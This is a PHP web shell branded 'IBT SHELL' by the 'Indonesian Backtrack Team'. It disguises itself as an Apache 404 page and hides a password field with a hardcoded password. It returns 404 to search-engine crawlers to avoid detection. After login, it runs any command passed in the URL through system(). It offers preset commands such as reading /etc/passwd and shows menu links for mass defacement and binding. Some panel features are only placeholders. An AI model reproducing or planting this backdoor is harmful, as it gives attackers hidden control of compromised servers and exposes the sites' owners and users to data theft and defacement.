<?php
/*
SHELL INDONESIAN BACKTRACK TEAM
AUTHOR : CEEMDE aka PARIKESIT
KURAWA IBT
DATE : 30/11/2014
COPYRIGHT : MIT LICENSE
FOR EDUCATIONAL PURPOSE
*/

session_start();
error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
?>

<html>
<head>
<title>IBT SHELL</title>
<style>
body{
margin:0;
background-image:url('ibt.png');
background-size:cover;
color:#fff;
letter-spacing:0.5px;
}
p{
font-size:14px;
line-height:24px;
}
table{
background:rgba(0,0,0,0.9);
}
a{
text-decoration:none;
color:red;
}
.overlay{
position:absolute;
#background:rgba(0,0,0,0.75);
width:100%;
height:100%;
left:0;
top:0;
right:0;
z-index:-1;
}
</style>
</head>
<body>

<?php
//Check User Agent
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "facebook","yahoo");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
	}	
}

//Check Login
if(isset($_POST['password'])){
	$pass = $_POST['password'];
	if($pass == "hasny"){
		$_SESSION['login'] = "Masuk";
	}
}

//Logout
if(isset($_GET['action']) == "logout"){
session_start();
session_destroy();
$serv = htmlentities($_SERVER['PHP_SELF']);
header('location:'.$serv);
}

// ================================
// if user is logged in
if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
// welcome user
?>

<div class="overlay"></div>
	<table width="100%" border="1" cellpadding="20px" cellspacing="0">
		<tr>
			<td>
					<p align="left"><?php 
								echo "Server Time : ".date("d-m-Y H:i:s")." (GMT + 7)<br />";
								echo "Software : ". $_SERVER['SERVER_SOFTWARE']."  ";
								echo "<a href='?action=phpinfo' target='_blank'>PHP Info</a> /"; 
								//Check Mysql
								if(function_exists('mysql_connect')){
								echo ' Mysql : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Mysql : <font color="red"> OFF</font> / ';
								}
								//Check Mssql
								if(function_exists('mssql_connect')){
								echo ' Mssql : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Mssql : <font color="yellow"> OFF</font> / ';
								}
								//Check Oracle
								if(function_exists('ocilogon')){
								echo ' Oracle : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Oracle : <font color="yellow"> OFF</font> / ';
								}
								//Check PostgreSQL
								if(function_exists('pg_connect')){
								echo ' PostgreSQL : <font color="green"> ON</font> / ';
								}
								else{
								echo ' PostgreSQL : <font color="yellow"> OFF</font> / ';
								}
								//Check Curl
								if(function_exists('curl_version')){
								echo ' Curl : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Curl : <font color="red"> OFF</font> / ';
								}
								//Check Sockets
								
								//Check Exec
								if(function_exists('exec')){
								echo ' Exec : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Exec : <font color="red"> OFF</font> / ';
								}
								//Check Openbasedir
								if(!ini_get('open_basedir') != "on"){
								echo ' Open_basedir : <font color="red"> OFF</font> / ';
								}
								else{
								echo ' Open_basedir : <font color="green"> ON</font> / ';
								}
								//Check Ini Restore
								if(!ini_get('ini_restore') != "on"){
								echo ' Ini_restore : <font color="red"> OFF</font> / ';
								}
								else{
								echo ' Ini_restore : <font color="green"> ON</font> / ';
								}
								//Check Magic Quotes
								if(ini_get('magic_quotes_gpc') == '1'){
									echo 'Magic_quotes_gpc : <font color="red"> ON</font> <a href="?turnoff="><font color="#00ff00"> Turn off </a> ';
								}
								else{
									echo 'Magic_quotes_gpc : <font color="green"> OFF</font>';
								}
								?>
								Sockets: <font color="#008000">ON</font> / 
								Fetch: <font color="#008000">ON</font> / 
								Wget: <font color="#008000">ON</font> / 
								Perl: <font color="#008000">ON</font> / 
								GCC: <font color="#008000">ON</font><br />
								<?php

								echo "uname -a : ".php_uname()." (Check Exploit)<br />"; 	
								
								if(ini_get('safe_mode') == '1'){
									echo 'Safe mode:<font color="red"> ON </font> <a href="?turnoff=">(Turn OFF)</a> <br />';
								}
								else{
									echo 'Safe mode:<font color="green"> OFF </font><br />';
								} 
								?>
								
								<a href="?file=">C:\</a><a href="?file=">xampp\</a><a href="?file=">htdocs\</a><a href="?file=">shell\</a>&nbsp;&nbsp;&nbsp;<font color="green">drwxrwxrwx</font>
								<br>Filesystem Mounted: 42.61 GB of 97.56 GB (43.68%)
								<br>ifconfig : <?=gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?=gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
								<br />Detected drives: 
								<a href="?xtux=ls&amp;d=a%3A%5C" onclick="return confirm('Make sure this is correct.')">[ a ]</a> 
								<a href="?xtux=ls&amp;d=c%3A%5C">[ c ]</a> 
								<a href="?xtux=ls&amp;d=d%3A%5C">[ d ]</a> 
								<a href="?xtux=ls&amp;d=e%3A%5C">[ e ]</a> 
								<a href="?xtux=ls&amp;d=f%3A%5C">[ f ]</a> 
								<br><a href="?"></a>
								Disabled Functions : None (Bypass)<br />
					</p>
			</td>
		</tr>
		<?php
			//Exec Form
			if(isset($_GET['cmd'])){
		?>
		<tr>
		<td>
		<?php
		//Filter Command For Windows And For Unix
		$command = $_GET['cmd'];
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			if(preg_match("/ifconfig/", $command)||preg_match("/ls/", $command)||preg_match("/cat/", $command)||preg_match("/grep/", $command)||preg_match("/wget/", $command)||preg_match("/apt-get/", $command)||preg_match("/install/", $command)||preg_match("/mkdir/", $command)){
				echo '<font color="red"><b>This command not work on windows!</b></font><br />';
			}
		}
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'UNI') {
			if(preg_match("/ls/", $command)||preg_match("/tree/", $command)||preg_match("/cd../", $command)){
				echo '<font color="red"><b>This command not work on linux!</b></font><br />';
			}
		} 
		?>
		<textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;"><?=system($_GET['cmd'])?></textarea></td>
		</tr>
		<?php
		}
		?>
		<tr>
			<td style="font-size:14px;">
			<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">File</a> | 
			<a href="?action=">Mysql</a> | 
			<a href="?action=">Symlink</a> | 
			<a href="?action=">Mass Deface</a> | 
			<a href="?action=">Hasher</a> | 
			<a href="?action=">Bind</a> | 
			<a href="?action=">Terminal</a> | 
			<a href="?action=">Self-Destroy</a> | 
			<a href="?action=logout">Logout</a>			
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="background:transparent;" cellspacing="7px">
					<tr style="font-weight:bold;"><td>Nama</td><td>Size</td><td>Last Edit</td><td>Perm</td><td>Action</td></tr>
					<tr style="font-size:12px;"><td>.</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>..</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>tools/</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>index.php</td><td>100 KB</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>config.php</td><td>22 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="font-size:14px;background:transparent;" cellpadding="20px">
					<tr>
						<td>
							Upload : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/><br /><br /><input type="file" name="file" /> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							Change Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value="C:/xampp/htdocs/shell""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							Make Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							Read File : <br /><input type="text" placeholder="/path/file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							Make File : <br /><input type="text" placeholder="file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Execute : <br /><input type="text" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" name="submit" value="Send"/>
							</form>
						</td>
					</tr>
					<tr>
						<td>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Ready Command : <br />
												  <?php 
													if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
												  ?>
												  <select name="cmd">
												  <option value="whoami">Check Priv </option>
												  <option value="netstat -an">Cek Port Listen</option>
												  <option value="dir">List Directory</option>
												  <option value="start cmd.exe">Jalankan Cmd</option>
												  </select> 
												  <?php }else{ ?>
												  <select name="cmd">
												  <option value="whoami">Check Priv</option>
												  <option value="netstat -an">Cek Port Listen</option>
												  <option value="ls -la">List All hiden File</option>
												  <option value="ls">List Directory</option>
												  <option value="uname -a">Information Kernel</option>
												  <option value="cat /etc/passwd">Read /etc/passwd</option>
												  <option value="cat /etc/hosts">Read /etc/hosts</option>
												  </select> 												  
												  <?php } ?>
												 
							<input type="submit" name="submit" value="Send"/>
							</form>
						</td>
					</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<p style="text-align:center;font-weight:bolder;">Copyright Indonesian Backtrack Team</p>
			</td>
		</tr>
	</table>

	
<?php
}else{
?>
<body style="margin:10px;background:#fff;color:#000;">
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
	<style>
		input { margin:0;background-color:#fff;border:1px solid #fff; }
	</style>
	<center>
	<form method="post" action="<?php $_SERVER['PHP_SELF'];?>" >
	<input type="password" name="password" style="background:transparent;outline:none;border:none;color:#fff;">
	</form></center>
<?php
}
?>
</body>
</html>